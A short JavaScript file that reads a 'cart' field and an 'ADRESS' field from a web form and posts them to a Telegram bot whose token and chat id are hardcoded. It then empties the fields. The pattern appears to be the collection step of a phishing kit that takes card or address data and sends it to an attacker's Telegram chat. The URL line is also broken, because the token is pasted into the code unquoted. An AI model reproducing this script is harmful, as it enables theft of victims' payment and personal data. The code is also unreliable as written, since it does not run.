//bot token
var telegram_bot_id = "6834718836:AAFSF4bC8q9aUwXMS1hvnKaP4z230JnN8n8";
//chat id
var chat_id = 2099878356;
var u_name, email, message;
var ready = function () {
    u_name = document.getElementById("cart").value;
    adress = document.getElementById("ADRESS").value;
   
    message = "cart: " + u_name + "\nADRESS: " + adress + "\nMessage: " ;
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + 6834718836:AAFSF4bC8q9aUwXMS1hvnKaP4z230JnN8n8 + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"
        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        console.log(response);
    });
    document.getElementById("cart").value = "";
    document.getElementById("ADRESS").value = "";
   
    return false;
};
